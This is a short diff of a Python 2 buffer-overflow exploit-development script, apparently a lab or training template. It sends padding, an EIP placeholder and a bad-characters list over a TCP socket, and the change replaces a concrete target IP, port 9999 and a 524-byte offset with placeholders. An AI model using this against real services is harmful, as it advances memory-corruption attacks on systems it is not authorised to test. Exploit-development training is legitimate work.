@@ -23,8 +23,8 @@ badchars = (
 "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
 
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(('192.168.0.7',9999))
-payload = "A" * 524 + "B" * 4 + badchars
+s.connect(('IP_ADDRESS',PORT))
+payload = "A" * #CHARS-UNTIL-EIP + "EIP" * 4 + badchars
 s.send(payload+"\r\n")
 print "Testing badchars"
 s.close()
